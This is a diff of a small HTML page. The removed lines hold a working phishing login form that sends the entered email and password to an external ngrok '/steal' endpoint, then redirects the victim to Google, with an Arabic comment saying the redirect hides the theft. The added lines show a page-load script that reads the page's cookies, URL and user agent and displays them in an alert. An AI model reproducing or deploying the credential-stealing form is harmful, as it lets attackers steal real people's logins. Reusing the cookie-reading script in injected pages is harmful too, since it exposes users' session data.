@@ -2,34 +2,19 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Login</title>
+  <title>Page Info</title>
+  <script>
+    window.onload = function () {
+      const url = document.location.href;
+      const cookies = document.cookie || "No cookies available";
+      const userAgent = navigator.userAgent;
+
+      const message = `📄 Page Info:\n\n🌐 URL: ${url}\n\n🍪 Cookies: ${cookies}\n\n📱 User-Agent:\n${userAgent}`;
+      alert(message);
+    };
+  </script>
 </head>
 <body>
-  <h2>Sign in</h2>
-  <form id="loginForm">
-    <input type="email" id="email" placeholder="Email" required /><br><br>
-    <input type="password" id="password" placeholder="Password" required /><br><br>
-    <button type="submit">Log In</button>
-  </form>
-
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
-      console.log("Sending data:", { email, password });
-
-      fetch('https://77b7dc87561a.ngrok-free.app/steal', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
-      }).catch(err => console.error('Fetch error:', err));
-
-      // توجيه المستخدم لصفحة وهمية أو حقيقية لتغطية العملية
-      window.location.href = "https://www.google.com";
-    });
-  </script>
+  <h1>👋 مرحباً بك في الصفحة</h1>
 </body>
 </html>
